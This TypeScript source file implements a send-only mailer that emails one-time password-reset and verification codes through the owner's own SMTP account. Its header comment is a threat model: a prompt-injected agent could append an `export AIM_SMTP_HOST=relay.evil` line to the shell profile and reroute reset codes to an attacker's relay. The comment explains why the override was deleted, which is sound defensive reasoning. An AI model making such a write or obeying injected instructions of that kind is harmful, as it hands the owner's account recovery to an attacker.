/**
 * Send-only 2FA mailer (TRDD-P7XKV3N9 sibling — multi-channel password recovery).
 *
 * Delivers a one-shot verification code to a user's registered email so a REMOTE
 * device (iPad/iPhone) can complete a password reset, or verify its email at
 * registration. Runs entirely IN-PROCESS — no third-party SaaS — relaying through the
 * owner's OWN authenticated SMTP (mail sent directly from a residential Mac is rejected
 * or spam-foldered by iCloud/Gmail: no SPF/DKIM/DMARC, dynamic IP, no reverse DNS). It
 * is SEND-ONLY: never opens a mailbox, never reads mail, holds no IMAP credentials.
 *
 * AUTO-CONFIGURED FROM THE EMAIL (the "autoconfigure it based on the user email"
 * requirement): the owner registers their email and stores their provider app-password
 * ONCE; the SMTP host/port/TLS are then DERIVED from the email domain (lib/email-providers)
 * and the password read from the OS credential store (lib/smtp-credential). gmail →
 * Gmail SMTP, icloud → iCloud SMTP, and so on — no manual server config.
 *
 * THE DASHBOARD IS THE ONLY SOURCE (TRDD-CC9PY337, USER directive 2026-07-17). There is no
 * env path. The relay is configured at Settings -> Hosts -> Recovery Email, which derives the
 * SMTP settings from the email domain and stores the password in the OS keychain.
 *
 * There USED to be an AIM_SMTP_HOST/PORT/USER/PASS/FROM/SECURE override. It is DELETED — not
 * gated, not validated: deleted. It was an account-takeover vector, and the vector was the
 * environment the server INHERITS, not a remote attacker. Agents run as the SAME UID as the
 * server, so a prompt-injected agent could append `export AIM_SMTP_HOST=relay.evil` to
 * ~/.zshrc — a low-suspicion write — and every password-reset code would then transit an
 * attacker's relay after the next restart, silently, with the dashboard still showing the
 * owner's own provider. A stale export from a debugging session did the same by accident.
 *
 * Gating it on NODE_ENV was considered and rejected: that still READS the var in development,
 * and dev machines run agents too. Deleting the read closes the vector in both modes. Nothing
 * legitimate is lost — the dashboard configures every field this override could reach.
 *
 * Resolution:
 *   1. Auto-config — detectProvider(accountEmail) + the stored app-password.
 *   2. Not configured -> DORMANT: sendCodeEmail() is a no-op {ok:false, skipped:true} and
 *      the caller falls back to the console channel. So the feature builds, tests, and
 *      ships with NO credentials, lighting up the moment the owner adds them. Email is
 *      one recovery channel among three (console, email, passkey), never a hard dep.
 */
import nodemailer from 'nodemailer'
import { detectProvider } from './email-providers'
import { getSmtpPassword } from './smtp-credential'
import { getRecoveryEmail } from './governance'
import { resolveAuthUser } from './smtp-autodetect'

export interface MailerConfig {
  host: string
  port: number
  user: string
  pass: string
  from: string
  secure: boolean
}

/**
 * Auto-config for a registered email: the app-password from the credential store, plus SMTP
 * settings that PREFER the stored autodetected config (correct for corporate/regional domains
 * and the local-part username quirk) and fall back to the curated table for a consumer
 * provider whose settings were never explicitly stored. Null when no password is stored yet.
 */
function autoConfig(accountEmail: string): MailerConfig | null {
  const pass = getSmtpPassword(accountEmail)
  if (!pass) return null
  let host: string, port: number, secure: boolean, usernameFormat: 'full' | 'local'
  // The MAESTRO's explicit SMTP login id, when stored (TRDD-P7XKV3N9). Only the stored
  // recovery config can carry it; the curated table knows only usernameFormat.
  let explicitUsername: string | undefined
  const rec = getRecoveryEmail()
  if (rec && rec.email.toLowerCase() === accountEmail.toLowerCase() && rec.smtp) {
    ({ host, port, secure, usernameFormat } = rec.smtp)
    explicitUsername = rec.smtp.username
  } else {
    const provider = detectProvider(accountEmail)
    if (!provider) return null
    host = provider.host
    port = provider.port
    secure = provider.secure
    usernameFormat = provider.usernameFormat ?? 'full' // most providers use the full address; some regional telcos use the local part
  }
  // An explicit userid wins; else derive (local-part for a few EU telcos, full address otherwise).
  const user = resolveAuthUser(accountEmail, usernameFormat, explicitUsername)
  return { host, port, secure, user, from: accountEmail, pass }
}

/**
 * Resolve the SMTP config for `accountEmail` (the owner's registered address), or null when no
 * relay is configured. The dashboard is the only source — there is no env path (TRDD-CC9PY337);
 * without an account email there is nothing to resolve.
 */
export function getMailerConfig(accountEmail?: string): MailerConfig | null {
  return accountEmail ? autoConfig(accountEmail) : null
}

export function isMailerConfigured(accountEmail?: string): boolean {
  return getMailerConfig(accountEmail) !== null
}

export type SendResult =
  | { ok: true }
  | { ok: false; skipped: true } // mailer not configured — caller falls back to console
  | { ok: false; error: string } // configured but the send failed

/**
 * Send a one-shot verification code to `to`, using the owner's own SMTP account.
 * `accountEmail` defaults to `to` — the recovery case sends the owner a code at their
 * OWN registered address, which is also the SMTP account, so a single argument covers
 * it. Returns {ok:false, skipped:true} when the mailer is not configured (the caller
 * then delivers via the console channel instead).
 *
 * `code` is digits-only (setup-bootstrap.generateCode), so interpolating it into the
 * subject/body is injection-safe. `purpose` is a short caller-supplied literal noun
 * ("password reset", "email verification") — never user input.
 */
export async function sendCodeEmail(to: string, code: string, purpose: string, accountEmail: string = to): Promise<SendResult> {
  const cfg = getMailerConfig(accountEmail)
  if (!cfg) return { ok: false, skipped: true }
  try {
    const transport = nodemailer.createTransport({
      host: cfg.host,
      port: cfg.port,
      secure: cfg.secure,
      auth: { user: cfg.user, pass: cfg.pass },
    })
    await transport.sendMail({
      from: cfg.from,
      to,
      subject: `AI Maestro ${purpose} code: ${code}`,
      text:
        `Your AI Maestro ${purpose} code is ${code}.\n\n` +
        `It expires in 5 minutes. If you did not request this, you can ignore this email — ` +
        `no change is made without the code.\n`,
    })
    return { ok: true }
  } catch (e) {
    // Never throw: a send failure must degrade to the console channel, not 500 the
    // recovery flow. The caller inspects {ok:false, error} and falls back.
    return { ok: false, error: e instanceof Error ? e.message : String(e) }
  }
}

/**
 * Send a verification code to a NORMAL/FOREIGN user's own email THROUGH the MAESTRO relay
 * (TRDD-7U927FCM 2B — the role-split). The user supplied ONLY a destination address; the
 * host authenticates and sends as the MAESTRO's own mail provider — so `to` is the user and
 * the SMTP `from`/account is the MAESTRO's recovery email (autoConfig resolves the stored
 * relay because accountEmail === that email).
 *
 * Gated on a VERIFIED MAESTRO relay: `verified` means the MAESTRO already sent+received a
 * code through this provider, i.e. it is PROVEN to send. With no verified relay there is no
 * trustworthy way to reach the user by email, so this returns {ok:false, skipped:true} and
 * the caller MUST fall back to another factor — never a silent success on a relay that may
 * not work. (An unverified or unconfigured relay is treated the same as an unconfigured
 * mailer, matching sendCodeEmail's skipped contract.)
 */
export async function sendUserCodeEmail(userEmail: string, code: string, purpose: string): Promise<SendResult> {
  const relay = getRecoveryEmail()
  if (!relay?.email || !relay.verified) return { ok: false, skipped: true }
  return sendCodeEmail(userEmail, code, purpose, relay.email)
}
